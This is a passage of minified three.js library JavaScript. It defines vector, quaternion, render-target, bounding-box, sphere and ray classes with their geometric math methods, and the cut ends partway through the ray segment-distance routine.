            random() { return this.x = Math.random(), this.y = Math.random(), this.z = Math.random(), this.w = Math.random(), this }
        }
        ye.prototype.isVector4 = !0;
        class xe extends se {
            constructor(e, t, n) { super(), this.width = e, this.height = t, this.depth = 1, this.scissor = new ye(0, 0, e, t), this.scissorTest = !1, this.viewport = new ye(0, 0, e, t), n = n || {}, this.texture = new ge(void 0, n.mapping, n.wrapS, n.wrapT, n.magFilter, n.minFilter, n.format, n.type, n.anisotropy, n.encoding), this.texture.image = {}, this.texture.image.width = e, this.texture.image.height = t, this.texture.image.depth = 1, this.texture.generateMipmaps = void 0 !== n.generateMipmaps && n.generateMipmaps, this.texture.minFilter = void 0 !== n.minFilter ? n.minFilter : B, this.depthBuffer = void 0 === n.depthBuffer || n.depthBuffer, this.stencilBuffer = void 0 !== n.stencilBuffer && n.stencilBuffer, this.depthTexture = void 0 !== n.depthTexture ? n.depthTexture : null }
            setTexture(e) { e.image = { width: this.width, height: this.height, depth: this.depth }, this.texture = e }
            setSize(e, t, n = 1) { this.width === e && this.height === t && this.depth === n || (this.width = e, this.height = t, this.depth = n, this.texture.image.width = e, this.texture.image.height = t, this.texture.image.depth = n, this.dispose()), this.viewport.set(0, 0, e, t), this.scissor.set(0, 0, e, t) }
            clone() { return (new this.constructor).copy(this) }
            copy(e) { return this.width = e.width, this.height = e.height, this.depth = e.depth, this.viewport.copy(e.viewport), this.texture = e.texture.clone(), this.depthBuffer = e.depthBuffer, this.stencilBuffer = e.stencilBuffer, this.depthTexture = e.depthTexture, this }
            dispose() { this.dispatchEvent({ type: "dispose" }) }
        }
        xe.prototype.isWebGLRenderTarget = !0;
        class _e {
            constructor(e = 0, t = 0, n = 0, i = 1) { this._x = e, this._y = t, this._z = n, this._w = i }
            static slerp(e, t, n, i) { return n.copy(e).slerp(t, i) }
            static slerpFlat(e, t, n, i, r, a, o) {
                let s = n[i + 0],
                    l = n[i + 1],
                    c = n[i + 2],
                    u = n[i + 3];
                const h = r[a + 0],
                    d = r[a + 1],
                    p = r[a + 2],
                    f = r[a + 3];
                if (0 === o) return e[t + 0] = s, e[t + 1] = l, e[t + 2] = c, void(e[t + 3] = u);
                if (1 === o) return e[t + 0] = h, e[t + 1] = d, e[t + 2] = p, void(e[t + 3] = f);
                if (u !== f || s !== h || l !== d || c !== p) {
                    let e = 1 - o;
                    const t = s * h + l * d + c * p + u * f,
                        n = t >= 0 ? 1 : -1,
                        i = 1 - t * t;
                    if (i > Number.EPSILON) {
                        const r = Math.sqrt(i),
                            a = Math.atan2(r, t * n);
                        e = Math.sin(e * a) / r, o = Math.sin(o * a) / r
                    }
                    const r = o * n;
                    if (s = s * e + h * r, l = l * e + d * r, c = c * e + p * r, u = u * e + f * r, e === 1 - o) {
                        const e = 1 / Math.sqrt(s * s + l * l + c * c + u * u);
                        s *= e, l *= e, c *= e, u *= e
                    }
                }
                e[t] = s, e[t + 1] = l, e[t + 2] = c, e[t + 3] = u
            }
            static multiplyQuaternionsFlat(e, t, n, i, r, a) {
                const o = n[i],
                    s = n[i + 1],
                    l = n[i + 2],
                    c = n[i + 3],
                    u = r[a],
                    h = r[a + 1],
                    d = r[a + 2],
                    p = r[a + 3];
                return e[t] = o * p + c * u + s * d - l * h, e[t + 1] = s * p + c * h + l * u - o * d, e[t + 2] = l * p + c * d + o * h - s * u, e[t + 3] = c * p - o * u - s * h - l * d, e
            }
            get x() { return this._x }
            set x(e) { this._x = e, this._onChangeCallback() }
            get y() { return this._y }
            set y(e) { this._y = e, this._onChangeCallback() }
            get z() { return this._z }
            set z(e) { this._z = e, this._onChangeCallback() }
            get w() { return this._w }
            set w(e) { this._w = e, this._onChangeCallback() }
            set(e, t, n, i) { return this._x = e, this._y = t, this._z = n, this._w = i, this._onChangeCallback(), this }
            clone() { return new this.constructor(this._x, this._y, this._z, this._w) }
            copy(e) { return this._x = e.x, this._y = e.y, this._z = e.z, this._w = e.w, this._onChangeCallback(), this }
            setFromEuler(e, t) {
                if (!e || !e.isEuler) throw new Error("THREE.Quaternion: .setFromEuler() now expects an Euler rotation rather than a Vector3 and order.");
                const n = e._x,
                    i = e._y,
                    r = e._z,
                    a = e._order,
                    o = Math.cos,
                    s = Math.sin,
                    l = o(n / 2),
                    c = o(i / 2),
                    u = o(r / 2),
                    h = s(n / 2),
                    d = s(i / 2),
                    p = s(r / 2);
                switch (a) {
                    case "XYZ":
                        this._x = h * c * u + l * d * p, this._y = l * d * u - h * c * p, this._z = l * c * p + h * d * u, this._w = l * c * u - h * d * p;
                        break;
                    case "YXZ":
                        this._x = h * c * u + l * d * p, this._y = l * d * u - h * c * p, this._z = l * c * p - h * d * u, this._w = l * c * u + h * d * p;
                        break;
                    case "ZXY":
                        this._x = h * c * u - l * d * p, this._y = l * d * u + h * c * p, this._z = l * c * p + h * d * u, this._w = l * c * u - h * d * p;
                        break;
                    case "ZYX":
                        this._x = h * c * u - l * d * p, this._y = l * d * u + h * c * p, this._z = l * c * p - h * d * u, this._w = l * c * u + h * d * p;
                        break;
                    case "YZX":
                        this._x = h * c * u + l * d * p, this._y = l * d * u + h * c * p, this._z = l * c * p - h * d * u, this._w = l * c * u - h * d * p;
                        break;
                    case "XZY":
                        this._x = h * c * u - l * d * p, this._y = l * d * u - h * c * p, this._z = l * c * p + h * d * u, this._w = l * c * u + h * d * p;
                        break;
                    default:
                        console.warn("THREE.Quaternion: .setFromEuler() encountered an unknown order: " + a)
                }
                return !1 !== t && this._onChangeCallback(), this
            }
            setFromAxisAngle(e, t) {
                const n = t / 2,
                    i = Math.sin(n);
                return this._x = e.x * i, this._y = e.y * i, this._z = e.z * i, this._w = Math.cos(n), this._onChangeCallback(), this
            }
            setFromRotationMatrix(e) {
                const t = e.elements,
                    n = t[0],
                    i = t[4],
                    r = t[8],
                    a = t[1],
                    o = t[5],
                    s = t[9],
                    l = t[2],
                    c = t[6],
                    u = t[10],
                    h = n + o + u;
                if (h > 0) {
                    const e = .5 / Math.sqrt(h + 1);
                    this._w = .25 / e, this._x = (c - s) * e, this._y = (r - l) * e, this._z = (a - i) * e
                } else if (n > o && n > u) {
                    const e = 2 * Math.sqrt(1 + n - o - u);
                    this._w = (c - s) / e, this._x = .25 * e, this._y = (i + a) / e, this._z = (r + l) / e
                } else if (o > u) {
                    const e = 2 * Math.sqrt(1 + o - n - u);
                    this._w = (r - l) / e, this._x = (i + a) / e, this._y = .25 * e, this._z = (s + c) / e
                } else {
                    const e = 2 * Math.sqrt(1 + u - n - o);
                    this._w = (a - i) / e, this._x = (r + l) / e, this._y = (s + c) / e, this._z = .25 * e
                }
                return this._onChangeCallback(), this
            }
            setFromUnitVectors(e, t) { let n = e.dot(t) + 1; return n < 1e-6 ? (n = 0, Math.abs(e.x) > Math.abs(e.z) ? (this._x = -e.y, this._y = e.x, this._z = 0, this._w = n) : (this._x = 0, this._y = -e.z, this._z = e.y, this._w = n)) : (this._x = e.y * t.z - e.z * t.y, this._y = e.z * t.x - e.x * t.z, this._z = e.x * t.y - e.y * t.x, this._w = n), this.normalize() }
            angleTo(e) { return 2 * Math.acos(Math.abs(ue.clamp(this.dot(e), -1, 1))) }
            rotateTowards(e, t) { const n = this.angleTo(e); if (0 === n) return this; const i = Math.min(1, t / n); return this.slerp(e, i), this }
            identity() { return this.set(0, 0, 0, 1) }
            invert() { return this.conjugate() }
            conjugate() { return this._x *= -1, this._y *= -1, this._z *= -1, this._onChangeCallback(), this }
            dot(e) { return this._x * e._x + this._y * e._y + this._z * e._z + this._w * e._w }
            lengthSq() { return this._x * this._x + this._y * this._y + this._z * this._z + this._w * this._w }
            length() { return Math.sqrt(this._x * this._x + this._y * this._y + this._z * this._z + this._w * this._w) }
            normalize() { let e = this.length(); return 0 === e ? (this._x = 0, this._y = 0, this._z = 0, this._w = 1) : (e = 1 / e, this._x = this._x * e, this._y = this._y * e, this._z = this._z * e, this._w = this._w * e), this._onChangeCallback(), this }
            multiply(e, t) { return void 0 !== t ? (console.warn("THREE.Quaternion: .multiply() now only accepts one argument. Use .multiplyQuaternions( a, b ) instead."), this.multiplyQuaternions(e, t)) : this.multiplyQuaternions(this, e) }
            premultiply(e) { return this.multiplyQuaternions(e, this) }
            multiplyQuaternions(e, t) {
                const n = e._x,
                    i = e._y,
                    r = e._z,
                    a = e._w,
                    o = t._x,
                    s = t._y,
                    l = t._z,
                    c = t._w;
                return this._x = n * c + a * o + i * l - r * s, this._y = i * c + a * s + r * o - n * l, this._z = r * c + a * l + n * s - i * o, this._w = a * c - n * o - i * s - r * l, this._onChangeCallback(), this
            }
            slerp(e, t) {
                if (0 === t) return this;
                if (1 === t) return this.copy(e);
                const n = this._x,
                    i = this._y,
                    r = this._z,
                    a = this._w;
                let o = a * e._w + n * e._x + i * e._y + r * e._z;
                if (o < 0 ? (this._w = -e._w, this._x = -e._x, this._y = -e._y, this._z = -e._z, o = -o) : this.copy(e), o >= 1) return this._w = a, this._x = n, this._y = i, this._z = r, this;
                const s = 1 - o * o;
                if (s <= Number.EPSILON) { const e = 1 - t; return this._w = e * a + t * this._w, this._x = e * n + t * this._x, this._y = e * i + t * this._y, this._z = e * r + t * this._z, this.normalize(), this._onChangeCallback(), this }
                const l = Math.sqrt(s),
                    c = Math.atan2(l, o),
                    u = Math.sin((1 - t) * c) / l,
                    h = Math.sin(t * c) / l;
                return this._w = a * u + this._w * h, this._x = n * u + this._x * h, this._y = i * u + this._y * h, this._z = r * u + this._z * h, this._onChangeCallback(), this
            }
            equals(e) { return e._x === this._x && e._y === this._y && e._z === this._z && e._w === this._w }
            fromArray(e, t = 0) { return this._x = e[t], this._y = e[t + 1], this._z = e[t + 2], this._w = e[t + 3], this._onChangeCallback(), this }
            toArray(e = [], t = 0) { return e[t] = this._x, e[t + 1] = this._y, e[t + 2] = this._z, e[t + 3] = this._w, e }
            fromBufferAttribute(e, t) { return this._x = e.getX(t), this._y = e.getY(t), this._z = e.getZ(t), this._w = e.getW(t), this }
            _onChange(e) { return this._onChangeCallback = e, this }
            _onChangeCallback() {}
        }
        _e.prototype.isQuaternion = !0;
        class be {
            constructor(e = 0, t = 0, n = 0) { this.x = e, this.y = t, this.z = n }
            set(e, t, n) { return void 0 === n && (n = this.z), this.x = e, this.y = t, this.z = n, this }
            setScalar(e) { return this.x = e, this.y = e, this.z = e, this }
            setX(e) { return this.x = e, this }
            setY(e) { return this.y = e, this }
            setZ(e) { return this.z = e, this }
            setComponent(e, t) {
                switch (e) {
                    case 0:
                        this.x = t;
                        break;
                    case 1:
                        this.y = t;
                        break;
                    case 2:
                        this.z = t;
                        break;
                    default:
                        throw new Error("index is out of range: " + e)
                }
                return this
            }
            getComponent(e) {
                switch (e) {
                    case 0:
                        return this.x;
                    case 1:
                        return this.y;
                    case 2:
                        return this.z;
                    default:
                        throw new Error("index is out of range: " + e)
                }
            }
            clone() { return new this.constructor(this.x, this.y, this.z) }
            copy(e) { return this.x = e.x, this.y = e.y, this.z = e.z, this }
            add(e, t) { return void 0 !== t ? (console.warn("THREE.Vector3: .add() now only accepts one argument. Use .addVectors( a, b ) instead."), this.addVectors(e, t)) : (this.x += e.x, this.y += e.y, this.z += e.z, this) }
            addScalar(e) { return this.x += e, this.y += e, this.z += e, this }
            addVectors(e, t) { return this.x = e.x + t.x, this.y = e.y + t.y, this.z = e.z + t.z, this }
            addScaledVector(e, t) { return this.x += e.x * t, this.y += e.y * t, this.z += e.z * t, this }
            sub(e, t) { return void 0 !== t ? (console.warn("THREE.Vector3: .sub() now only accepts one argument. Use .subVectors( a, b ) instead."), this.subVectors(e, t)) : (this.x -= e.x, this.y -= e.y, this.z -= e.z, this) }
            subScalar(e) { return this.x -= e, this.y -= e, this.z -= e, this }
            subVectors(e, t) { return this.x = e.x - t.x, this.y = e.y - t.y, this.z = e.z - t.z, this }
            multiply(e, t) { return void 0 !== t ? (console.warn("THREE.Vector3: .multiply() now only accepts one argument. Use .multiplyVectors( a, b ) instead."), this.multiplyVectors(e, t)) : (this.x *= e.x, this.y *= e.y, this.z *= e.z, this) }
            multiplyScalar(e) { return this.x *= e, this.y *= e, this.z *= e, this }
            multiplyVectors(e, t) { return this.x = e.x * t.x, this.y = e.y * t.y, this.z = e.z * t.z, this }
            applyEuler(e) { return e && e.isEuler || console.error("THREE.Vector3: .applyEuler() now expects an Euler rotation rather than a Vector3 and order."), this.applyQuaternion(Me.setFromEuler(e)) }
            applyAxisAngle(e, t) { return this.applyQuaternion(Me.setFromAxisAngle(e, t)) }
            applyMatrix3(e) {
                const t = this.x,
                    n = this.y,
                    i = this.z,
                    r = e.elements;
                return this.x = r[0] * t + r[3] * n + r[6] * i, this.y = r[1] * t + r[4] * n + r[7] * i, this.z = r[2] * t + r[5] * n + r[8] * i, this
            }
            applyNormalMatrix(e) { return this.applyMatrix3(e).normalize() }
            applyMatrix4(e) {
                const t = this.x,
                    n = this.y,
                    i = this.z,
                    r = e.elements,
                    a = 1 / (r[3] * t + r[7] * n + r[11] * i + r[15]);
                return this.x = (r[0] * t + r[4] * n + r[8] * i + r[12]) * a, this.y = (r[1] * t + r[5] * n + r[9] * i + r[13]) * a, this.z = (r[2] * t + r[6] * n + r[10] * i + r[14]) * a, this
            }
            applyQuaternion(e) {
                const t = this.x,
                    n = this.y,
                    i = this.z,
                    r = e.x,
                    a = e.y,
                    o = e.z,
                    s = e.w,
                    l = s * t + a * i - o * n,
                    c = s * n + o * t - r * i,
                    u = s * i + r * n - a * t,
                    h = -r * t - a * n - o * i;
                return this.x = l * s + h * -r + c * -o - u * -a, this.y = c * s + h * -a + u * -r - l * -o, this.z = u * s + h * -o + l * -a - c * -r, this
            }
            project(e) { return this.applyMatrix4(e.matrixWorldInverse).applyMatrix4(e.projectionMatrix) }
            unproject(e) { return this.applyMatrix4(e.projectionMatrixInverse).applyMatrix4(e.matrixWorld) }
            transformDirection(e) {
                const t = this.x,
                    n = this.y,
                    i = this.z,
                    r = e.elements;
                return this.x = r[0] * t + r[4] * n + r[8] * i, this.y = r[1] * t + r[5] * n + r[9] * i, this.z = r[2] * t + r[6] * n + r[10] * i, this.normalize()
            }
            divide(e) { return this.x /= e.x, this.y /= e.y, this.z /= e.z, this }
            divideScalar(e) { return this.multiplyScalar(1 / e) }
            min(e) { return this.x = Math.min(this.x, e.x), this.y = Math.min(this.y, e.y), this.z = Math.min(this.z, e.z), this }
            max(e) { return this.x = Math.max(this.x, e.x), this.y = Math.max(this.y, e.y), this.z = Math.max(this.z, e.z), this }
            clamp(e, t) { return this.x = Math.max(e.x, Math.min(t.x, this.x)), this.y = Math.max(e.y, Math.min(t.y, this.y)), this.z = Math.max(e.z, Math.min(t.z, this.z)), this }
            clampScalar(e, t) { return this.x = Math.max(e, Math.min(t, this.x)), this.y = Math.max(e, Math.min(t, this.y)), this.z = Math.max(e, Math.min(t, this.z)), this }
            clampLength(e, t) { const n = this.length(); return this.divideScalar(n || 1).multiplyScalar(Math.max(e, Math.min(t, n))) }
            floor() { return this.x = Math.floor(this.x), this.y = Math.floor(this.y), this.z = Math.floor(this.z), this }
            ceil() { return this.x = Math.ceil(this.x), this.y = Math.ceil(this.y), this.z = Math.ceil(this.z), this }
            round() { return this.x = Math.round(this.x), this.y = Math.round(this.y), this.z = Math.round(this.z), this }
            roundToZero() { return this.x = this.x < 0 ? Math.ceil(this.x) : Math.floor(this.x), this.y = this.y < 0 ? Math.ceil(this.y) : Math.floor(this.y), this.z = this.z < 0 ? Math.ceil(this.z) : Math.floor(this.z), this }
            negate() { return this.x = -this.x, this.y = -this.y, this.z = -this.z, this }
            dot(e) { return this.x * e.x + this.y * e.y + this.z * e.z }
            lengthSq() { return this.x * this.x + this.y * this.y + this.z * this.z }
            length() { return Math.sqrt(this.x * this.x + this.y * this.y + this.z * this.z) }
            manhattanLength() { return Math.abs(this.x) + Math.abs(this.y) + Math.abs(this.z) }
            normalize() { return this.divideScalar(this.length() || 1) }
            setLength(e) { return this.normalize().multiplyScalar(e) }
            lerp(e, t) { return this.x += (e.x - this.x) * t, this.y += (e.y - this.y) * t, this.z += (e.z - this.z) * t, this }
            lerpVectors(e, t, n) { return this.x = e.x + (t.x - e.x) * n, this.y = e.y + (t.y - e.y) * n, this.z = e.z + (t.z - e.z) * n, this }
            cross(e, t) { return void 0 !== t ? (console.warn("THREE.Vector3: .cross() now only accepts one argument. Use .crossVectors( a, b ) instead."), this.crossVectors(e, t)) : this.crossVectors(this, e) }
            crossVectors(e, t) {
                const n = e.x,
                    i = e.y,
                    r = e.z,
                    a = t.x,
                    o = t.y,
                    s = t.z;
                return this.x = i * s - r * o, this.y = r * a - n * s, this.z = n * o - i * a, this
            }
            projectOnVector(e) { const t = e.lengthSq(); if (0 === t) return this.set(0, 0, 0); const n = e.dot(this) / t; return this.copy(e).multiplyScalar(n) }
            projectOnPlane(e) { return we.copy(this).projectOnVector(e), this.sub(we) }
            reflect(e) { return this.sub(we.copy(e).multiplyScalar(2 * this.dot(e))) }
            angleTo(e) { const t = Math.sqrt(this.lengthSq() * e.lengthSq()); if (0 === t) return Math.PI / 2; const n = this.dot(e) / t; return Math.acos(ue.clamp(n, -1, 1)) }
            distanceTo(e) { return Math.sqrt(this.distanceToSquared(e)) }
            distanceToSquared(e) {
                const t = this.x - e.x,
                    n = this.y - e.y,
                    i = this.z - e.z;
                return t * t + n * n + i * i
            }
            manhattanDistanceTo(e) { return Math.abs(this.x - e.x) + Math.abs(this.y - e.y) + Math.abs(this.z - e.z) }
            setFromSpherical(e) { return this.setFromSphericalCoords(e.radius, e.phi, e.theta) }
            setFromSphericalCoords(e, t, n) { const i = Math.sin(t) * e; return this.x = i * Math.sin(n), this.y = Math.cos(t) * e, this.z = i * Math.cos(n), this }
            setFromCylindrical(e) { return this.setFromCylindricalCoords(e.radius, e.theta, e.y) }
            setFromCylindricalCoords(e, t, n) { return this.x = e * Math.sin(t), this.y = n, this.z = e * Math.cos(t), this }
            setFromMatrixPosition(e) { const t = e.elements; return this.x = t[12], this.y = t[13], this.z = t[14], this }
            setFromMatrixScale(e) {
                const t = this.setFromMatrixColumn(e, 0).length(),
                    n = this.setFromMatrixColumn(e, 1).length(),
                    i = this.setFromMatrixColumn(e, 2).length();
                return this.x = t, this.y = n, this.z = i, this
            }
            setFromMatrixColumn(e, t) { return this.fromArray(e.elements, 4 * t) }
            setFromMatrix3Column(e, t) { return this.fromArray(e.elements, 3 * t) }
            equals(e) { return e.x === this.x && e.y === this.y && e.z === this.z }
            fromArray(e, t = 0) { return this.x = e[t], this.y = e[t + 1], this.z = e[t + 2], this }
            toArray(e = [], t = 0) { return e[t] = this.x, e[t + 1] = this.y, e[t + 2] = this.z, e }
            fromBufferAttribute(e, t, n) { return void 0 !== n && console.warn("THREE.Vector3: offset has been removed from .fromBufferAttribute()."), this.x = e.getX(t), this.y = e.getY(t), this.z = e.getZ(t), this }
            random() { return this.x = Math.random(), this.y = Math.random(), this.z = Math.random(), this }
        }
        be.prototype.isVector3 = !0;
        const we = new be,
            Me = new _e;
        class Te {
            constructor(e = new be(1 / 0, 1 / 0, 1 / 0), t = new be(-1 / 0, -1 / 0, -1 / 0)) { this.min = e, this.max = t }
            set(e, t) { return this.min.copy(e), this.max.copy(t), this }
            setFromArray(e) {
                let t = 1 / 0,
                    n = 1 / 0,
                    i = 1 / 0,
                    r = -1 / 0,
                    a = -1 / 0,
                    o = -1 / 0;
                for (let s = 0, l = e.length; s < l; s += 3) {
                    const l = e[s],
                        c = e[s + 1],
                        u = e[s + 2];
                    l < t && (t = l), c < n && (n = c), u < i && (i = u), l > r && (r = l), c > a && (a = c), u > o && (o = u)
                }
                return this.min.set(t, n, i), this.max.set(r, a, o), this
            }
            setFromBufferAttribute(e) {
                let t = 1 / 0,
                    n = 1 / 0,
                    i = 1 / 0,
                    r = -1 / 0,
                    a = -1 / 0,
                    o = -1 / 0;
                for (let s = 0, l = e.count; s < l; s++) {
                    const l = e.getX(s),
                        c = e.getY(s),
                        u = e.getZ(s);
                    l < t && (t = l), c < n && (n = c), u < i && (i = u), l > r && (r = l), c > a && (a = c), u > o && (o = u)
                }
                return this.min.set(t, n, i), this.max.set(r, a, o), this
            }
            setFromPoints(e) { this.makeEmpty(); for (let t = 0, n = e.length; t < n; t++) this.expandByPoint(e[t]); return this }
            setFromCenterAndSize(e, t) { const n = Se.copy(t).multiplyScalar(.5); return this.min.copy(e).sub(n), this.max.copy(e).add(n), this }
            setFromObject(e) { return this.makeEmpty(), this.expandByObject(e) }
            clone() { return (new this.constructor).copy(this) }
            copy(e) { return this.min.copy(e.min), this.max.copy(e.max), this }
            makeEmpty() { return this.min.x = this.min.y = this.min.z = 1 / 0, this.max.x = this.max.y = this.max.z = -1 / 0, this }
            isEmpty() { return this.max.x < this.min.x || this.max.y < this.min.y || this.max.z < this.min.z }
            getCenter(e) { return void 0 === e && (console.warn("THREE.Box3: .getCenter() target is now required"), e = new be), this.isEmpty() ? e.set(0, 0, 0) : e.addVectors(this.min, this.max).multiplyScalar(.5) }
            getSize(e) { return void 0 === e && (console.warn("THREE.Box3: .getSize() target is now required"), e = new be), this.isEmpty() ? e.set(0, 0, 0) : e.subVectors(this.max, this.min) }
            expandByPoint(e) { return this.min.min(e), this.max.max(e), this }
            expandByVector(e) { return this.min.sub(e), this.max.add(e), this }
            expandByScalar(e) { return this.min.addScalar(-e), this.max.addScalar(e), this }
            expandByObject(e) {
                e.updateWorldMatrix(!1, !1);
                const t = e.geometry;
                void 0 !== t && (null === t.boundingBox && t.computeBoundingBox(), Le.copy(t.boundingBox), Le.applyMatrix4(e.matrixWorld), this.union(Le));
                const n = e.children;
                for (let e = 0, t = n.length; e < t; e++) this.expandByObject(n[e]);
                return this
            }
            containsPoint(e) { return !(e.x < this.min.x || e.x > this.max.x || e.y < this.min.y || e.y > this.max.y || e.z < this.min.z || e.z > this.max.z) }
            containsBox(e) { return this.min.x <= e.min.x && e.max.x <= this.max.x && this.min.y <= e.min.y && e.max.y <= this.max.y && this.min.z <= e.min.z && e.max.z <= this.max.z }
            getParameter(e, t) { return void 0 === t && (console.warn("THREE.Box3: .getParameter() target is now required"), t = new be), t.set((e.x - this.min.x) / (this.max.x - this.min.x), (e.y - this.min.y) / (this.max.y - this.min.y), (e.z - this.min.z) / (this.max.z - this.min.z)) }
            intersectsBox(e) { return !(e.max.x < this.min.x || e.min.x > this.max.x || e.max.y < this.min.y || e.min.y > this.max.y || e.max.z < this.min.z || e.min.z > this.max.z) }
            intersectsSphere(e) { return this.clampPoint(e.center, Se), Se.distanceToSquared(e.center) <= e.radius * e.radius }
            intersectsPlane(e) { let t, n; return e.normal.x > 0 ? (t = e.normal.x * this.min.x, n = e.normal.x * this.max.x) : (t = e.normal.x * this.max.x, n = e.normal.x * this.min.x), e.normal.y > 0 ? (t += e.normal.y * this.min.y, n += e.normal.y * this.max.y) : (t += e.normal.y * this.max.y, n += e.normal.y * this.min.y), e.normal.z > 0 ? (t += e.normal.z * this.min.z, n += e.normal.z * this.max.z) : (t += e.normal.z * this.max.z, n += e.normal.z * this.min.z), t <= -e.constant && n >= -e.constant }
            intersectsTriangle(e) {
                if (this.isEmpty()) return !1;
                this.getCenter(Ie), Oe.subVectors(this.max, Ie), Ae.subVectors(e.a, Ie), Re.subVectors(e.b, Ie), Pe.subVectors(e.c, Ie), Ce.subVectors(Re, Ae), De.subVectors(Pe, Re), Ne.subVectors(Ae, Pe);
                let t = [0, -Ce.z, Ce.y, 0, -De.z, De.y, 0, -Ne.z, Ne.y, Ce.z, 0, -Ce.x, De.z, 0, -De.x, Ne.z, 0, -Ne.x, -Ce.y, Ce.x, 0, -De.y, De.x, 0, -Ne.y, Ne.x, 0];
                return !!Fe(t, Ae, Re, Pe, Oe) && (t = [1, 0, 0, 0, 1, 0, 0, 0, 1], !!Fe(t, Ae, Re, Pe, Oe) && (He.crossVectors(Ce, De), t = [He.x, He.y, He.z], Fe(t, Ae, Re, Pe, Oe)))
            }
            clampPoint(e, t) { return void 0 === t && (console.warn("THREE.Box3: .clampPoint() target is now required"), t = new be), t.copy(e).clamp(this.min, this.max) }
            distanceToPoint(e) { return Se.copy(e).clamp(this.min, this.max).sub(e).length() }
            getBoundingSphere(e) { return void 0 === e && console.error("THREE.Box3: .getBoundingSphere() target is now required"), this.getCenter(e.center), e.radius = .5 * this.getSize(Se).length(), e }
            intersect(e) { return this.min.max(e.min), this.max.min(e.max), this.isEmpty() && this.makeEmpty(), this }
            union(e) { return this.min.min(e.min), this.max.max(e.max), this }
            applyMatrix4(e) { return this.isEmpty() || (Ee[0].set(this.min.x, this.min.y, this.min.z).applyMatrix4(e), Ee[1].set(this.min.x, this.min.y, this.max.z).applyMatrix4(e), Ee[2].set(this.min.x, this.max.y, this.min.z).applyMatrix4(e), Ee[3].set(this.min.x, this.max.y, this.max.z).applyMatrix4(e), Ee[4].set(this.max.x, this.min.y, this.min.z).applyMatrix4(e), Ee[5].set(this.max.x, this.min.y, this.max.z).applyMatrix4(e), Ee[6].set(this.max.x, this.max.y, this.min.z).applyMatrix4(e), Ee[7].set(this.max.x, this.max.y, this.max.z).applyMatrix4(e), this.setFromPoints(Ee)), this }
            translate(e) { return this.min.add(e), this.max.add(e), this }
            equals(e) { return e.min.equals(this.min) && e.max.equals(this.max) }
        }
        Te.prototype.isBox3 = !0;
        const Ee = [new be, new be, new be, new be, new be, new be, new be, new be],
            Se = new be,
            Le = new Te,
            Ae = new be,
            Re = new be,
            Pe = new be,
            Ce = new be,
            De = new be,
            Ne = new be,
            Ie = new be,
            Oe = new be,
            He = new be,
            Ue = new be;

        function Fe(e, t, n, i, r) {
            for (let a = 0, o = e.length - 3; a <= o; a += 3) {
                Ue.fromArray(e, a);
                const o = r.x * Math.abs(Ue.x) + r.y * Math.abs(Ue.y) + r.z * Math.abs(Ue.z),
                    s = t.dot(Ue),
                    l = n.dot(Ue),
                    c = i.dot(Ue);
                if (Math.max(-Math.max(s, l, c), Math.min(s, l, c)) > o) return !1
            }
            return !0
        }
        const ze = new Te;
        class Be {
            constructor(e = new be, t = -1) { this.center = e, this.radius = t }
            set(e, t) { return this.center.copy(e), this.radius = t, this }
            setFromPoints(e, t) {
                const n = this.center;
                void 0 !== t ? n.copy(t) : ze.setFromPoints(e).getCenter(n);
                let i = 0;
                for (let t = 0, r = e.length; t < r; t++) i = Math.max(i, n.distanceToSquared(e[t]));
                return this.radius = Math.sqrt(i), this
            }
            copy(e) { return this.center.copy(e.center), this.radius = e.radius, this }
            isEmpty() { return this.radius < 0 }
            makeEmpty() { return this.center.set(0, 0, 0), this.radius = -1, this }
            containsPoint(e) { return e.distanceToSquared(this.center) <= this.radius * this.radius }
            distanceToPoint(e) { return e.distanceTo(this.center) - this.radius }
            intersectsSphere(e) { const t = this.radius + e.radius; return e.center.distanceToSquared(this.center) <= t * t }
            intersectsBox(e) { return e.intersectsSphere(this) }
            intersectsPlane(e) { return Math.abs(e.distanceToPoint(this.center)) <= this.radius }
            clampPoint(e, t) { const n = this.center.distanceToSquared(e); return void 0 === t && (console.warn("THREE.Sphere: .clampPoint() target is now required"), t = new be), t.copy(e), n > this.radius * this.radius && (t.sub(this.center).normalize(), t.multiplyScalar(this.radius).add(this.center)), t }
            getBoundingBox(e) { return void 0 === e && (console.warn("THREE.Sphere: .getBoundingBox() target is now required"), e = new Te), this.isEmpty() ? (e.makeEmpty(), e) : (e.set(this.center, this.center), e.expandByScalar(this.radius), e) }
            applyMatrix4(e) { return this.center.applyMatrix4(e), this.radius = this.radius * e.getMaxScaleOnAxis(), this }
            translate(e) { return this.center.add(e), this }
            equals(e) { return e.center.equals(this.center) && e.radius === this.radius }
            clone() { return (new this.constructor).copy(this) }
        }
        const Ge = new be,
            ke = new be,
            Ve = new be,
            We = new be,
            je = new be,
            qe = new be,
            Xe = new be;
        class Ye {
            constructor(e = new be, t = new be(0, 0, -1)) { this.origin = e, this.direction = t }
            set(e, t) { return this.origin.copy(e), this.direction.copy(t), this }
            copy(e) { return this.origin.copy(e.origin), this.direction.copy(e.direction), this }
            at(e, t) { return void 0 === t && (console.warn("THREE.Ray: .at() target is now required"), t = new be), t.copy(this.direction).multiplyScalar(e).add(this.origin) }
            lookAt(e) { return this.direction.copy(e).sub(this.origin).normalize(), this }
            recast(e) { return this.origin.copy(this.at(e, Ge)), this }
            closestPointToPoint(e, t) { void 0 === t && (console.warn("THREE.Ray: .closestPointToPoint() target is now required"), t = new be), t.subVectors(e, this.origin); const n = t.dot(this.direction); return n < 0 ? t.copy(this.origin) : t.copy(this.direction).multiplyScalar(n).add(this.origin) }
            distanceToPoint(e) { return Math.sqrt(this.distanceSqToPoint(e)) }
            distanceSqToPoint(e) { const t = Ge.subVectors(e, this.origin).dot(this.direction); return t < 0 ? this.origin.distanceToSquared(e) : (Ge.copy(this.direction).multiplyScalar(t).add(this.origin), Ge.distanceToSquared(e)) }
            distanceSqToSegment(e, t, n, i) {
                ke.copy(e).add(t).multiplyScalar(.5), Ve.copy(t).sub(e).normalize(), We.copy(this.origin).sub(ke);
                const r = .5 * e.distanceTo(t),
                    a = -this.direction.dot(Ve),
                    o = We.dot(this.direction),
                    s = -We.dot(Ve),
                    l = We.lengthSq(),
                    c = Math.abs(1 - a * a);
                let u, h, d, p;
                if (c > 0)
                    if (u = a * s - o, h = a * o - s, p = r * c, u >= 0)
                        if (h >= -p)
                            if (h <= p) {
                                const e = 1 / c;
                                u *= e, h *= e, d = u * (u + a * h + 2 * o) + h * (a * u + h + 2 * s) + l
                            } else h = r, u = Math.max(0, -(a * h + o)), d = -u * u + h * (h + 2 * s) + l;
                else h = -r, u = Math.max(0, -(a * h + o)), d = -u * u + h * (h + 2 * s) + l;
